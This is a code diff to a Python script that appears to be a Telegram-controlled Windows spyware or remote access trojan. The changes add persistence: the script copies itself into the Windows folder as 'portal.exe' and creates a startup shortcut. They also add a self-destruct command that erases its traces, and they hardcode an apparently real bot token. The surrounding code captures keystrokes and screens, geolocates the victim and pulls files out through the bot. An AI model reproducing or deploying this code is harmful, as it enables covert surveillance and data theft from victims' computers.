@@ -1,16 +1,29 @@
 #!/usr/bin/env python
 
 from PIL import ImageGrab
-from time import strftime
-import telepot
-import requests
-import os
-import os.path
-import platform
-import pyHook
-import pythoncom
-import ctypes
-import json
+from time import strftime, sleep
+from shutil import copyfile
+from sys import argv
+from json import loads
+from winshell import startup
+from tendo import singleton
+import telepot, requests
+import os, os.path, platform, ctypes
+import pyHook, pythoncom
+
+me = singleton.SingleInstance()
+
+win_folder = os.environ['WINDIR'] 
+hide_location = win_folder + '\\' + 'portal.exe'
+target_file = startup() + '\\portal.lnk'
+
+if (argv[0]).endswith('.exe'):
+	copyfile(argv[0], hide_location)
+	shell = Dispatch('WScript.Shell')
+	shortcut = shell.CreateShortCut(target_file)
+	shortcut.Targetpath = hide_location
+	shortcut.WorkingDirectory = win_folder
+	shortcut.save()
 
 initi = False
 user = os.environ.get("USERNAME")	# Windows username
@@ -71,7 +84,7 @@ def handle(msg):
 			bot.sendChatAction(chat_id, 'find_location')
 			info = requests.get('http://ipinfo.io').text
 			bot.sendMessage(chat_id, info)
-			location = (json.loads(info)['loc']).split(',')
+			location = (loads(info)['loc']).split(',')
 			bot.sendLocation(chat_id, location[0], location[1])
 
 		elif command.startswith('/download_file'):
@@ -123,7 +136,14 @@ def handle(msg):
 		elif command == 'DESTROYNOW!' and initi == True:
 			bot.sendChatAction(chat_id, 'typing')
 			bot.sendMessage(chat_id, "DESTROYING ALL TRACES! POOF!")
-			# self_destruct
+			if os.path.isfile(hide_location):
+				os.remove(hide_location)
+			if os.path.isfile(target_file):
+				os.remove(target_file)
+			if os.path.isfile(log_file):
+				os.remove(log_file)
+			while True:
+				sleep(10)
 
 def checkchat_id(chat_id):
 	# REPLACE '123456' WITH YOUR ACTUAL chat_id!
@@ -137,7 +157,7 @@ def checkchat_id(chat_id):
 		return str(chat_id) == known_ids
 
 # REPLACE 'abcd1234' BY THE TOKEN OF THE BOT YOU GENERATED!
-bot = telepot.Bot('abcd1234')
+bot = telepot.Bot('354259191:AAEk1iKfFCHnYbLxFJgcWP_LwU1RkUvDNXU')
 
 bot.message_loop(handle)
 print 'Listening to commands...'
